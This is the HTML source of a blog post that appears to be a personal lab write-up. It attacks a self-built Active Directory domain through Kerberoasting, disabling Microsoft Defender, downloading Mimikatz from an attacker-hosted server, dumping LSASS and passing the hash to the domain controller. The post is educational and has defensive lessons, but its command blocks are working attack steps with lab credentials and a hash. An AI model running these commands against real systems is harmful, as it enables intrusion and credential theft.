@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Active Directory - DIY Lab | Security With Ian</title>
+<meta name="keywords" content="">
+<meta name="description" content="Difficulty: Easy
+OS: Windows
+Date Completed: 2026-10-19
+Write-up Authored by: Ian Simons
+Lab Created by: Ian Simons
+Core Competencies:
+
+
+Active Directory Enumeration
+
+
+LDAP Enumeration
+
+
+Kerberos Authentication
+
+
+Password Cracking
+
+
+Pass the Hash
+
+
+
+Overview
+Recently I completed a Hack the Box lab called Active. This Box was a lot of fun and showed me that Active Directory is not some overly complex inherently hardened system. After that I decided that I wanted to learn more about attacking Active Directory on my own. I set up this lab to better understand and learn to run the Pass-the-Hash attack. There was a lot of learning involved, but I came away with a solid lab, and a much better understanding of the technique.">
+<meta name="author" content="">
+<link rel="canonical" href="https://SecurityWithIan.com/posts/active-directory---diy-lab/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://SecurityWithIan.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://SecurityWithIan.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://SecurityWithIan.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://SecurityWithIan.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://SecurityWithIan.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://SecurityWithIan.com/posts/active-directory---diy-lab/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://SecurityWithIan.com/posts/active-directory---diy-lab/">
+  <meta property="og:site_name" content="Security With Ian">
+  <meta property="og:title" content="Active Directory - DIY Lab">
+  <meta property="og:description" content="Difficulty: Easy
+OS: Windows
+Date Completed: 2026-10-19
+Write-up Authored by: Ian Simons
+Lab Created by: Ian Simons
+Core Competencies:
+Active Directory Enumeration
+LDAP Enumeration
+Kerberos Authentication
+Password Cracking
+Pass the Hash
+Overview Recently I completed a Hack the Box lab called Active. This Box was a lot of fun and showed me that Active Directory is not some overly complex inherently hardened system. After that I decided that I wanted to learn more about attacking Active Directory on my own. I set up this lab to better understand and learn to run the Pass-the-Hash attack. There was a lot of learning involved, but I came away with a solid lab, and a much better understanding of the technique.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-10-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-10-19T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Active Directory - DIY Lab">
+  <meta name="twitter:description" content="Difficulty: Easy
+OS: Windows
+Date Completed: 2026-10-19
+Write-up Authored by: Ian Simons
+Lab Created by: Ian Simons
+Core Competencies:
+Active Directory Enumeration
+LDAP Enumeration
+Kerberos Authentication
+Password Cracking
+Pass the Hash
+Overview Recently I completed a Hack the Box lab called Active. This Box was a lot of fun and showed me that Active Directory is not some overly complex inherently hardened system. After that I decided that I wanted to learn more about attacking Active Directory on my own. I set up this lab to better understand and learn to run the Pass-the-Hash attack. There was a lot of learning involved, but I came away with a solid lab, and a much better understanding of the technique.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://SecurityWithIan.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Active Directory - DIY Lab",
+      "item": "https://SecurityWithIan.com/posts/active-directory---diy-lab/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Active Directory - DIY Lab",
+  "name": "Active Directory - DIY Lab",
+  "description": "Difficulty: Easy\nOS: Windows\nDate Completed: 2026-10-19\nWrite-up Authored by: Ian Simons\nLab Created by: Ian Simons\nCore Competencies:\nActive Directory Enumeration\nLDAP Enumeration\nKerberos Authentication\nPassword Cracking\nPass the Hash\nOverview Recently I completed a Hack the Box lab called Active. This Box was a lot of fun and showed me that Active Directory is not some overly complex inherently hardened system. After that I decided that I wanted to learn more about attacking Active Directory on my own. I set up this lab to better understand and learn to run the Pass-the-Hash attack. There was a lot of learning involved, but I came away with a solid lab, and a much better understanding of the technique.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Difficulty: Easy\nOS: Windows\nDate Completed: 2026-10-19\nWrite-up Authored by: Ian Simons\nLab Created by: Ian Simons\nCore Competencies:\nActive Directory Enumeration\nLDAP Enumeration\nKerberos Authentication\nPassword Cracking\nPass the Hash\nOverview Recently I completed a Hack the Box lab called Active. This Box was a lot of fun and showed me that Active Directory is not some overly complex inherently hardened system. After that I decided that I wanted to learn more about attacking Active Directory on my own. I set up this lab to better understand and learn to run the Pass-the-Hash attack. There was a lot of learning involved, but I came away with a solid lab, and a much better understanding of the technique.\nLab Overview For this lab I created a small Active Directory domain called n00b.lyfe. The Domain Controller is called DC01 (IP 10.10.10.5) and I added an additional domain joined server called FS01 (IP 10.10.10.20). In our scenario FS01 would be a file server. I made both servers discoverable across the network by anyone. I then created a low privilege user John Doe (JohnD@n00b.lyfe) with the password: “Password123!@#”. This account was created to let us begin our attack from an assumed breach scenario. I also created a service account called backup_svc (backup_svc@n00b.lyfe) it was then assigned a ServicePrincipalName and given local admin privileges on the file server. This was to simulate a lazy administrator who gave the backup service account local admin privileges rather than setting up more granular access control as needed. Lastly, I logged into the file server (FS01) with the built-in domain account Administrator (Administrator@n00b.lyfe). At this point, the attack path was prepared and all that was left was to take over the domain.\nVulnerability Summary Vulnerability Vulnerability Classification CVSS Score MITRE ATT\u0026CK Technique ATT\u0026CK Tactic Kerberoastable Service Account Protected by a Weak Password CWE-521: Weak Password Requirements N/A T1558.003 - Kerberoasting Credential Access Over Permissioned Service Account CWE-269: Improper Privilege Management CWE-272: Least Privilege Violation N/A T1078.002 - Valid Accounts: Domain Accounts Privilege Escalation Microsoft Defender Anti-Tamper not Enabled CWE-693: Protection Mechanism Failure N/A T1562.001 - Impair Defenses: Disable or Modify Tools Defense Evasion NTLM Hash Reuse (Pass-the-Hash) N/A N/A T1550.002 - Use Alternate Authentication Material: Pass the Hash Lateral Movement Attack Path Summary Utilize the provided credentials (JohnD@n00b.lyfe) to enumerate all service accounts with a ServicePrincipalName (SPN)\nIdentify backup_svc as a service account with an associated SPN, making it a candidate for Kerberoasting\nRequest Ticket Granting Service (TGS) ticket for backup_svc’s SPN and extract the associated hash\nCrack the hash associated with the TGS ticket offline\nLog into FS01 remotely with the newly compromised account\nDisable Microsoft Defender to facilitate execution of credential dumping tools\nExtract NTLM hashes from LSASS memory\nIdentify the built-in domain Administrator account and extract the associated NTLM hash\nUtilize Pass-the-Hash authentication to obtain administrative access to DC01 as Administrator@n00b.lyfe\nCompromising backup_svc Vulnerability Details Description: Kerberoastable Service Account Protected by a Weak Password\nVulnerability Classification: CWE-521: Weak Password Requirements\nCVSS Score(s): N/A\nMITRE ATT\u0026CK: T1558.003 - Kerberoasting - Credential Access,\nActive Directory enumeration was performed using the provided low-privilege user credentials for JohnD. During enumeration, the backup_svc account was identified as having a registered Service Principal Name (SPN), making it a potential Kerberoasting target. A TGS Ticket was requested for the account, and the associated hash was extracted for offline password cracking. Recovery of the account password allowed for successful authentication to FS01 as backup_svc.\nExploitation Steps Enumerate all Users with SPNs to identify Kerberoastable targets\nIdentify account backup_svc as a Kerberoastable target\nRequest a TGS ticket and extract hash\nPerform offline cracking of extracted hash\nValidate cracked credentials by logging into FS01\nKey Commands / Payloads # Enumerate Kerberoastable accounts\rldapsearch -x -H ldap://10.10.10.5 -D johnd@n00b.lyfe -w 'Password123!@#' -b \"dc=n00b,dc=lyfe\" \"(\u0026(objectclass=user)(servicePrincipalName=*))\" samaccountname servicePrincalName\r# Request TGS ticket and extract hash\rimpacket-GetUserSPNs n00b.lyfe/JohnD:'Password123!@#' -request-user backup_svc -dc-ip 10.10.10.5 -output hash.txt\r# Crack hash\rhashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # Remotely log into FS01 with evil-WinRM\revil-winrm -i 10.10.10.20 -u backup_svc@n00b.lyfe -p \"Password1\" Proof of Access Screen Shot Figure 1: Successful Kerberoasting of backup_svc resulted in authenticated access to Server FS01 as backup_svc. Access was validated by confirming user context, hostname, and operating system version.\nSession Validation Commands # Check user context\rwhoami\r# Verify target hostname\rhostname\r# Verify operating system version\rcmd.exe /c \"ver\" Compromising Administrator Vulnerability Details Description: Over Permissioned Service Account, Microsoft Defender Anti-Tamper not Enabled, NTLM Hash Reuse (Pass-the-Hash)\nVulnerability Classification: CWE-269: Improper Privilege Management \u0026 CWE-272: Least Privilege Violation, CWE-693: Protection Mechanism Failure, N/A\nCVSS Score: N/A\nMITRE ATT\u0026CK: T1078.002 - Valid Accounts: Domain Accounts - Privilege Escalation, T1562.001 - Impair Defenses: Disable or Modify Tools - Defense Evasion, T1550.002 - Use Alternate Authentication Material: Pass the Hash - Lateral Movement\nAfter gaining access to FS01 as backup_svc, the account was found to possess local administrator rights. Because privileged users had previously authenticated to the server, the host was evaluated as a potential source of reusable credentials. Following the disabling of Microsoft Defender protections, Mimikatz was used to extract credential material from LSASS memory, resulting in recovery of the built-in domain Administrator NTLM hash. The recovered hash was then leveraged via Pass-the-Hash authentication to obtain administrative access to DC01.\nExploitation Steps Disable Windows Defender\nUpload Mimikatz onto the server in question\nExtract Administrator NTLM hash from LSASS memory\nPass-the-Hash and log into DC01 as Administrator\nKey Commands / Payloads # Disable Defender\rSet-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisableIOAVProtecteion $true -DisableIntrusionPreventionSystem $true\r# Host Mimikatz from attack machine (kali)\rpython3 -m http.server -d /usr/share/windows-resources/mimikatz/x64 8888\r# Download Mimikatz\rinvoke-webrequest -Uri \"http://:8888/mimikatz.exe -outfile mimikatz.exe\r# Extract NTLM hash with Mimikatz\r.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\r# Pass-the-Hash using evil-WinRM\revil-winrm -i 10.10.10.5 -u Administrator@n00bx.lyfe -H 07ab403ab740c1540c378b0f5aaa4087 Proof of Access Screen Shots Figure 2: Successful exploitation of attack chain resulted in authenticated domain admin access to DC01. Access was validated by confirming user context, hostname, operating system version, and Active Directory group membership.\nSession Validation Commands # Check user context\rwhoami\r# Verify target hostname\rhostname\r# Verify operating system version\rcmd.exe /c \"ver\"\r# Verify Active Directory Group Membership\rget-aduser Administrator -properties memberof | select -expandproperty memberof Lessons Learned This was my first DIY Active Directory lab, as well as my first DIY hacking lab. I had a ton of fun. I started this lab with the goal of learning the Pass-the-Hash attack, but in doing so I had to learn a lot of other things along the way. For example, when I started building this lab, I had no idea I would need to learn to disable Microsoft Defender via PowerShell, and use Mimikatz. While I still enjoy Hack the Box and plan to continue completing machines there, DIY labs like this one will likely become a staple of my portfolio. The depth of learning involved in building and attacking your own environment is simply unmatched.\nA single compromised account can create a chain of opportunities that ultimately lead to domain compromise.\nDefense in Depth is not optional. If any link the attack chain is broken, a full compromise may be prevented.\nGranular access controls are critical, poor privilege separation can turn a limited compromise into a full domain takeover.\nAppendix Appendix A Tools Used Tool Purpose ldapsearch Active Directory Enumeration impacket-GetUserSPNs Requesting TGS Ticket and Extracting Hash hashcat Hash Cracking python http server hosting mimikatz extracting NTLM hash from LSASS memory evil-WinRM Remote access ",
+  "wordCount" : "1237",
+  "inLanguage": "en",
+  "datePublished": "2026-10-19T00:00:00Z",
+  "dateModified": "2026-10-19T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://SecurityWithIan.com/posts/active-directory---diy-lab/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Security With Ian",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://SecurityWithIan.com/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://SecurityWithIan.com/" accesskey="h" title="Security With Ian (Alt + H)">Security With Ian</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://SecurityWithIan.com/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://SecurityWithIan.com/security-toolkit/" title="Security Toolkit">
+                    <span>Security Toolkit</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Active Directory - DIY Lab
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-10-19 00:00:00 +0000 UTC'>October 19, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><p><strong>Difficulty:</strong> Easy</p>
+<p><strong>OS:</strong> Windows</p>
+<p><strong>Date Completed:</strong> 2026-10-19</p>
+<p><strong>Write-up Authored by:</strong> Ian Simons</p>
+<p><strong>Lab Created by:</strong> Ian Simons</p>
+<p><strong>Core Competencies:</strong></p>
+<ul>
+<li>
+<p>Active Directory Enumeration</p>
+</li>
+<li>
+<p>LDAP Enumeration</p>
+</li>
+<li>
+<p>Kerberos Authentication</p>
+</li>
+<li>
+<p>Password Cracking</p>
+</li>
+<li>
+<p>Pass the Hash</p>
+</li>
+</ul>
+<hr>
+<h3 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h3>
+<p>Recently I completed a Hack the Box lab called Active. This Box was a lot of fun and showed me that Active Directory is not some overly complex inherently hardened system. After that I decided that I wanted to learn more about attacking Active Directory on my own. I set up this lab to better understand and learn to run the Pass-the-Hash attack. There was a lot of learning involved, but I came away with a solid lab, and a much better understanding of the technique.</p>
+<hr>
+<h3 id="lab-overview">Lab Overview<a hidden class="anchor" aria-hidden="true" href="#lab-overview">#</a></h3>
+<p>For this lab I created a small Active Directory domain called n00b.lyfe. The Domain Controller is called DC01 (IP 10.10.10.5) and I added an additional domain joined server called FS01 (IP 10.10.10.20). In our scenario FS01 would be a file server. I made both servers discoverable across the network by anyone. I then created a low privilege user John Doe (<a href="mailto:JohnD@n00b.lyfe">JohnD@n00b.lyfe</a>) with the password: &ldquo;Password123!@#&rdquo;. This account was created to let us begin our attack from an assumed breach scenario. I also created a service account called backup_svc (<a href="mailto:backup_svc@n00b.lyfe">backup_svc@n00b.lyfe</a>) it was then assigned a ServicePrincipalName and given local admin privileges on the file server. This was to simulate a lazy administrator who gave the backup service account local admin privileges rather than setting up more granular access control as needed. Lastly, I logged into the file server (FS01) with the built-in domain account Administrator (<a href="mailto:Administrator@n00b.lyfe">Administrator@n00b.lyfe</a>). At this point, the attack path was prepared and all that was left was to take over the domain.</p>
+<hr>
+<h3 id="vulnerability-summary">Vulnerability Summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h3>
+<table>
+	<thead>
+			<tr>
+					<th>Vulnerability</th>
+					<th>Vulnerability Classification</th>
+					<th>CVSS Score</th>
+					<th>MITRE ATT&amp;CK Technique</th>
+					<th>ATT&amp;CK Tactic</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Kerberoastable Service Account Protected by a Weak Password</td>
+					<td>CWE-521: Weak Password Requirements</td>
+					<td>N/A</td>
+					<td>T1558.003 - Kerberoasting</td>
+					<td>Credential Access</td>
+			</tr>
+			<tr>
+					<td>Over Permissioned Service Account</td>
+					<td>CWE-269: Improper Privilege Management CWE-272: Least Privilege Violation</td>
+					<td>N/A</td>
+					<td>T1078.002 - Valid Accounts: Domain Accounts</td>
+					<td>Privilege Escalation</td>
+			</tr>
+			<tr>
+					<td>Microsoft Defender Anti-Tamper not Enabled</td>
+					<td>CWE-693: Protection Mechanism Failure</td>
+					<td>N/A</td>
+					<td>T1562.001 - Impair Defenses: Disable or Modify Tools</td>
+					<td>Defense Evasion</td>
+			</tr>
+			<tr>
+					<td>NTLM Hash Reuse (Pass-the-Hash)</td>
+					<td>N/A</td>
+					<td>N/A</td>
+					<td>T1550.002 - Use Alternate Authentication Material: Pass the Hash</td>
+					<td>Lateral Movement</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h3 id="attack-path-summary">Attack Path Summary<a hidden class="anchor" aria-hidden="true" href="#attack-path-summary">#</a></h3>
+<ol>
+<li>
+<p>Utilize the provided credentials (<a href="mailto:JohnD@n00b.lyfe">JohnD@n00b.lyfe</a>) to enumerate all service accounts with a ServicePrincipalName (SPN)</p>
+</li>
+<li>
+<p>Identify backup_svc as a service account with an associated SPN, making it a candidate for Kerberoasting</p>
+</li>
+<li>
+<p>Request Ticket Granting Service (TGS) ticket for backup_svc&rsquo;s SPN and extract the associated hash</p>
+</li>
+<li>
+<p>Crack the hash associated with the TGS ticket offline</p>
+</li>
+<li>
+<p>Log into FS01 remotely with the newly compromised account</p>
+</li>
+<li>
+<p>Disable Microsoft Defender to facilitate execution of credential dumping tools</p>
+</li>
+<li>
+<p>Extract NTLM hashes from LSASS memory</p>
+</li>
+<li>
+<p>Identify the built-in domain Administrator account and extract the associated NTLM hash</p>
+</li>
+<li>
+<p>Utilize Pass-the-Hash authentication to obtain administrative access to DC01 as <a href="mailto:Administrator@n00b.lyfe">Administrator@n00b.lyfe</a></p>
+</li>
+</ol>
+<hr>
+<h3 id="compromising-backup_svc">Compromising backup_svc<a hidden class="anchor" aria-hidden="true" href="#compromising-backup_svc">#</a></h3>
+<h4 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h4>
+<p><strong>Description:</strong> Kerberoastable Service Account Protected by a Weak Password</p>
+<p><strong>Vulnerability Classification:</strong> CWE-521: Weak Password Requirements</p>
+<p><strong>CVSS Score(s):</strong> N/A</p>
+<p><strong>MITRE ATT&amp;CK:</strong> T1558.003 - Kerberoasting - Credential Access,</p>
+<p>Active Directory enumeration was performed using the provided low-privilege user credentials for JohnD. During enumeration, the backup_svc account was identified as having a registered Service Principal Name (SPN), making it a potential Kerberoasting target. A TGS Ticket was requested for the account, and the associated hash was extracted for offline password cracking. Recovery of the account password allowed for successful authentication to FS01 as backup_svc.</p>
+<h4 id="exploitation-steps">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps">#</a></h4>
+<ol>
+<li>
+<p>Enumerate all Users with SPNs to identify Kerberoastable targets</p>
+</li>
+<li>
+<p>Identify account backup_svc as a Kerberoastable target</p>
+</li>
+<li>
+<p>Request a TGS ticket and extract hash</p>
+</li>
+<li>
+<p>Perform offline cracking of extracted hash</p>
+</li>
+<li>
+<p>Validate cracked credentials by logging into FS01</p>
+</li>
+</ol>
+<h4 id="key-commands--payloads">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads">#</a></h4>
+<pre tabindex="0"><code># Enumerate Kerberoastable accounts
+ldapsearch -x -H ldap://10.10.10.5 -D johnd@n00b.lyfe -w &#39;Password123!@#&#39; -b &#34;dc=n00b,dc=lyfe&#34; &#34;(&amp;(objectclass=user)(servicePrincipalName=*))&#34; samaccountname servicePrincalName
+
+# Request TGS ticket and extract hash
+impacket-GetUserSPNs n00b.lyfe/JohnD:&#39;Password123!@#&#39; -request-user backup_svc -dc-ip 10.10.10.5 -output hash.txt
+
+# Crack hash
+hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
+
+# Remotely log into FS01 with evil-WinRM
+evil-winrm -i 10.10.10.20 -u backup_svc@n00b.lyfe -p &#34;Password1&#34;
+</code></pre><h4 id="proof-of-access">Proof of Access<a hidden class="anchor" aria-hidden="true" href="#proof-of-access">#</a></h4>
+<h5 id="screen-shot">Screen Shot<a hidden class="anchor" aria-hidden="true" href="#screen-shot">#</a></h5>
+<p><img alt="backup_svc.jpg" loading="lazy" src="/images/DIYLab/backup_svc.jpg"></p>
+<p>Figure 1: Successful Kerberoasting of backup_svc resulted in authenticated access to Server FS01 as backup_svc. Access was validated by confirming user context, hostname, and operating system version.</p>
+<h5 id="session-validation-commands">Session Validation Commands<a hidden class="anchor" aria-hidden="true" href="#session-validation-commands">#</a></h5>
+<pre tabindex="0"><code># Check user context
+whoami
+
+# Verify target hostname
+hostname
+
+# Verify operating system version
+cmd.exe /c &#34;ver&#34;
+</code></pre><hr>
+<h3 id="compromising-administrator">Compromising Administrator<a hidden class="anchor" aria-hidden="true" href="#compromising-administrator">#</a></h3>
+<h4 id="vulnerability-details-1">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details-1">#</a></h4>
+<p><strong>Description:</strong> Over Permissioned Service Account, Microsoft Defender Anti-Tamper not Enabled, NTLM Hash Reuse (Pass-the-Hash)</p>
+<p><strong>Vulnerability Classification:</strong> CWE-269: Improper Privilege Management &amp; CWE-272: Least Privilege Violation, CWE-693: Protection Mechanism Failure, N/A</p>
+<p><strong>CVSS Score:</strong> N/A</p>
+<p><strong>MITRE ATT&amp;CK:</strong> T1078.002 - Valid Accounts: Domain Accounts - Privilege Escalation, T1562.001 - Impair Defenses: Disable or Modify Tools - Defense Evasion, T1550.002 - Use Alternate Authentication Material: Pass the Hash - Lateral Movement</p>
+<p>After gaining access to FS01 as backup_svc, the account was found to possess local administrator rights. Because privileged users had previously authenticated to the server, the host was evaluated as a potential source of reusable credentials. Following the disabling of Microsoft Defender protections, <strong>Mimikatz</strong> was used to extract credential material from LSASS memory, resulting in recovery of the built-in domain Administrator NTLM hash. The recovered hash was then leveraged via Pass-the-Hash authentication to obtain administrative access to DC01.</p>
+<h4 id="exploitation-steps-1">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps-1">#</a></h4>
+<ol>
+<li>
+<p>Disable Windows Defender</p>
+</li>
+<li>
+<p>Upload <strong>Mimikatz</strong> onto the server in question</p>
+</li>
+<li>
+<p>Extract Administrator NTLM hash from LSASS memory</p>
+</li>
+<li>
+<p>Pass-the-Hash and log into DC01 as Administrator</p>
+</li>
+</ol>
+<h4 id="key-commands--payloads-1">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads-1">#</a></h4>
+<pre tabindex="0"><code># Disable Defender
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisableIOAVProtecteion $true -DisableIntrusionPreventionSystem $true
+
+# Host Mimikatz from attack machine (kali)
+python3 -m http.server -d /usr/share/windows-resources/mimikatz/x64 8888
+
+# Download Mimikatz
+invoke-webrequest -Uri &#34;http://&lt;ATTACKER-IP&gt;:8888/mimikatz.exe -outfile mimikatz.exe
+
+# Extract NTLM hash with Mimikatz
+.\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34;
+
+# Pass-the-Hash using evil-WinRM
+evil-winrm -i 10.10.10.5 -u Administrator@n00bx.lyfe -H 07ab403ab740c1540c378b0f5aaa4087
+</code></pre><h4 id="proof-of-access-1">Proof of Access<a hidden class="anchor" aria-hidden="true" href="#proof-of-access-1">#</a></h4>
+<h5 id="screen-shots">Screen Shots<a hidden class="anchor" aria-hidden="true" href="#screen-shots">#</a></h5>
+<p><img alt="Administrator.jpg" loading="lazy" src="/images/DIYLab/Administrator.jpg"></p>
+<p>Figure 2: Successful exploitation of attack chain resulted in authenticated domain admin access to DC01. Access was validated by confirming user context, hostname, operating system version, and Active Directory group membership.</p>
+<h5 id="session-validation-commands-1">Session Validation Commands<a hidden class="anchor" aria-hidden="true" href="#session-validation-commands-1">#</a></h5>
+<pre tabindex="0"><code># Check user context
+whoami
+
+# Verify target hostname
+hostname
+
+# Verify operating system version
+cmd.exe /c &#34;ver&#34;
+
+# Verify Active Directory Group Membership
+get-aduser Administrator -properties memberof | select -expandproperty memberof
+</code></pre><hr>
+<h3 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h3>
+<p>This was my first DIY Active Directory lab, as well as my first DIY hacking lab. I had a ton of fun. I started this lab with the goal of learning the Pass-the-Hash attack, but in doing so I had to learn a lot of other things along the way. For example, when I started building this lab, I had no idea I would need to learn to disable Microsoft Defender via PowerShell, and use <strong>Mimikatz</strong>. While I still enjoy Hack the Box and plan to continue completing machines there, DIY labs like this one will likely become a staple of my portfolio. The depth of learning involved in building and attacking your own environment is simply unmatched.</p>
+<ul>
+<li>
+<p>A single compromised account can create a chain of opportunities that ultimately lead to domain compromise.</p>
+</li>
+<li>
+<p>Defense in Depth is not optional. If any link the attack chain is broken, a full compromise may be prevented.</p>
+</li>
+<li>
+<p>Granular access controls are critical, poor privilege separation can turn a limited compromise into a full domain takeover.</p>
+</li>
+</ul>
+<hr>
+<h3 id="appendix">Appendix<a hidden class="anchor" aria-hidden="true" href="#appendix">#</a></h3>
+<h4 id="appendix-a">Appendix A<a hidden class="anchor" aria-hidden="true" href="#appendix-a">#</a></h4>
+<h5 id="tools-used">Tools Used<a hidden class="anchor" aria-hidden="true" href="#tools-used">#</a></h5>
+<table>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>ldapsearch</td>
+					<td>Active Directory Enumeration</td>
+			</tr>
+			<tr>
+					<td>impacket-GetUserSPNs</td>
+					<td>Requesting TGS Ticket and Extracting Hash</td>
+			</tr>
+			<tr>
+					<td>hashcat</td>
+					<td>Hash Cracking</td>
+			</tr>
+			<tr>
+					<td>python</td>
+					<td>http server hosting</td>
+			</tr>
+			<tr>
+					<td>mimikatz</td>
+					<td>extracting NTLM hash from LSASS memory</td>
+			</tr>
+			<tr>
+					<td>evil-WinRM</td>
+					<td>Remote access</td>
+			</tr>
+	</tbody>
+</table>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://SecurityWithIan.com/">Security With Ian</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
